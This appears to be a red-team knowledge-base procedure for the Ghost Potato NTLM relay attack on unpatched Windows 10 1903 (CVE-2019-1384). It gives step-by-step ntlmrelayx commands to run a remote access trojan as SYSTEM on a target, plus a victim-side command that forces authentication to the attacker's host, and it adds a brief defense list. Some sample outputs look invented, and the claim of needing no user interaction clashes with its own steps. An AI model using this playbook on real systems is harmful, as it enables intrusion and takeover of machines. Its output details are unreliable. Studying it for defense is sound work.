---
id: 493356a9-6dcf-40a4-bf7b-4ce777fdbd5e
name: Ghost-Potato-NTLM-Relay-Attack
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:05.590680Z'
updated_at: '2023-04-10T20:26:35.416554Z'
tactics:
  - '[[Privilege Escalation]]'
  - '[[Lateral Movement]]'
techniques:
  - '[[LLMNR-NBT-NS Poisoning and SMB Relay]]'
  - '[[Bypass User Account Control]]'
sub_techniques: []
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Ghost Potato - CVE-2019-1384]]'
  - '[[tags/Man-in-the-Middle attacks & relaying]]'
commands:
  - '[[commands/ntlmrelayx-ghost-potato-relay]]'
platforms:
  - Windows
tools:
  - '[[tools/ntlmrelayx]]'
validated: true
---

# Ghost-Potato-NTLM-Relay-Attack

## Summary

The Ghost Potato NTLM Relay Attack exploits CVE-2019-1384, a vulnerability in Windows 10 version 1903, to achieve SYSTEM-level privileges on a target machine via NTLM authentication relaying. Using the ntlmrelayx tool from the Impacket suite, an attacker can relay authentication from a victim machine to the target, leveraging the Ghost Potato technique to execute an arbitrary executable as the NT Authority\System account without requiring local access or user interaction on the target.

## Description

This procedure details how to perform an NTLM relay attack enhanced with the Ghost Potato exploit (CVE-2019-1384). The vulnerability allows an attacker to impersonate the SYSTEM account by relaying NTLM authentication to the local Security Support Provider Interface (SSPI) on the target machine, enabling the execution of code with elevated privileges. The attack requires the target to be vulnerable (unpatched Windows 10 1903) and SMB signing disabled or bypassed. It is typically initiated by coercing a victim machine on the network to authenticate to the attacker's controlled relay server, which then forwards the authentication to the target. Upon successful relay, the --gpotato-startup option specifies an executable (e.g., a remote access trojan) to run as SYSTEM on the target. This technique is effective in Active Directory environments for lateral movement and privilege escalation, but it assumes the attacker has network position to intercept or spoof authentication requests (e.g., via LLMNR/NBT-NS poisoning).

## Requirements

1. Attacker machine with Python 3 and the Impacket suite installed, including ntlmrelayx.
2. Network access to a victim Windows machine (low-privilege user) and the target Windows machine vulnerable to CVE-2019-1384 (Windows 10 version 1903, unpatched).
3. SMB signing disabled on the target or network allowing unsigned SMB traffic.
4. A payload executable (e.g., rat.exe) prepared on the attacker machine to execute on the target.
5. Optional: Tools like Responder for poisoning to trigger authentication automatically.

## Defense

- Enforce SMB signing on all Windows machines to prevent NTLM relay attacks (Group Policy: Microsoft network server: Digitally sign communications (always)).
- Apply patches for CVE-2019-1384 immediately (Windows 10 updates post-November 2019).
- Disable NTLM authentication where possible, enforcing Kerberos-only (Group Policy: Network security: Restrict NTLM).
- Use strong passwords and enable multi-factor authentication (MFA) to limit credential reuse.
- Deploy network segmentation, endpoint detection and response (EDR) tools to monitor for anomalous SMB traffic and process creation as SYSTEM.
- Enable Windows Defender Credential Guard to protect LSASS and prevent relay-based impersonation.

## Objectives

1. Relay NTLM authentication from a victim to the target machine.
2. Exploit CVE-2019-1384 to execute code as NT Authority\System on the target.
3. Achieve persistent or interactive control over the target machine with elevated privileges.

## Instructions

### Step 1: Prepare the Payload

**Context**: Place the desired executable payload in the current working directory on the attacker machine. This payload (e.g., a RAT) will be executed as SYSTEM on the target upon successful relay. Ensure the payload is compatible with the target's architecture (x64 for most Windows 10 systems).

Copy or create your payload file:

```bash
cp /path/to/rat.exe .
```

> Verify the file exists and is executable. No specific command reference is needed here, but ensure the filename matches what will be specified in the relay command.

**Expected Output**: Payload file (e.g., rat.exe) present in the current directory.

### Step 2: Set Up the NTLM Relay with Ghost Potato

**Context**: Launch the ntlmrelayx tool configured for the Ghost Potato exploit. This starts a relay server that listens for incoming NTLM authentications. The --gpotato-startup flag enables the CVE-2019-1384 exploitation to run the specified payload as SYSTEM on the relayed target. Specify the target IP explicitly to direct the relay.

**Command** ([[commands/ntlmrelayx-ghost-potato-relay]]):

```bash
ntlmrelayx.py -t $_TARGET_IP -smb2support --no-smb-server --gpotato-startup $_PAYLOAD
```

> This command sets up the relay without starting an SMB server (use external poisoning if needed). Replace $_TARGET_IP with the vulnerable target's IP and $_PAYLOAD with the executable name (e.g., rat.exe). The tool will output listening status and wait for authentication attempts.

**Expected Output**: Console output indicating the relay server is listening on ports (e.g., 445 for SMB) and ready for targets. Example:

```
[*] Servers started, waiting for connections
[*] Callback handler running on 0.0.0.0:11000
```

### Step 3: Trigger NTLM Authentication from Victim

**Context**: Coerce a victim machine to authenticate to the attacker's relay server, initiating the NTLM challenge-response. This can be done manually from the victim (if controlled) or via network poisoning (e.g., using Responder). The relayed auth will be forwarded to the target, triggering the Ghost Potato exploit.

On the victim Windows machine (cmd.exe), execute a command to access a non-existent share on the attacker:

```cmd
 dir \\$_ATTACKER_IP\IPC$
```

> Replace $_ATTACKER_IP with the attacker's IP. This forces NTLM auth over SMB. If using poisoning, run Responder on attacker to spoof responses.

**Expected Output**: On the attacker console, authentication relay success, followed by execution logs. Example:

```
[*] SMB Server received connection from <victim_ip>
[+] NTLMv2 Client   : ::ffff:<victim_ip>
[*] Sending PILOT connection request
[+] Running 'gpotato' on <target_ip> with args: rat.exe
[*] Executing payload as SYSTEM
```

On the target, the payload (rat.exe) spawns as NT Authority\System (verify via Task Manager or event logs).

### Step 4: Verify Execution and Cleanup

**Context**: Confirm the payload executed with elevated privileges on the target. Monitor for connections back to the attacker if the payload is a RAT.

Use tools like netstat or check Windows Event Logs (Security ID 4672 for privilege use).

**Expected Output**: Evidence of SYSTEM process (e.g., rat.exe running under SYSTEM in Task Manager) or callback connection from target to attacker listener.

> If no execution, check target patch level, SMB signing, and network firewall rules.
